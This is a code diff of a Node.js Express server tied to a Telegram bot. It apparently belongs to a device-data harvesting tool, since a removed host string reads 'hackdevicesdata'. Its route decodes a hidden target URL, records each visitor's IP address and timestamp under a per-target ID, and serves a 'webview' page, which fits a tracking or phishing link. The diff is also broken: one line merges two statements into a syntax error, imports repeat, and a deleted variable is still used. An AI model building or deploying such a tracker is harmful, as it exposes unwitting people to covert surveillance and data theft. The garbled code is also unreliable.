@@ -1,37 +1,44 @@
 const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
-var bodyParser = require('body-parser');
+var cors = const fs = require("fs");
+const express = require("express");
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
-var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
-var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+
+// Install node-telegram-bot-api package
 const app = express();
+const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
+const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-//Modify your URL here
-var hostURL="hackdevicesdata.mrjokar11111.repl.co";
-//TOGGLE for Shorters
-var use1pt=true;
+// TOGGLE for Shorters
+let use1pt = false;
 
 
+app.get("/w/:path/:uri", (req, res) => {
+  let ip;
+  let d = new Date();
+  d = d.toJSON().slice(0, 19).replace('T', ':');
+  if (req.headers['x-forwarded-for']) {
+    ip = req.headers['x-forwarded-for'].split(",")[0];
+  } else if (req.connection && req.connection.remoteAddress) {
+    ip = req.connection.remoteAddress;
+  } else {
+    ip = req.ip;
+  }
 
-app.get("/w/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
+  if (req.params.path != null) {
+    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+  } else {
+    res.redirect("https://t.me/th30neand0nly0ne");
+  }
+});
 
          
                               
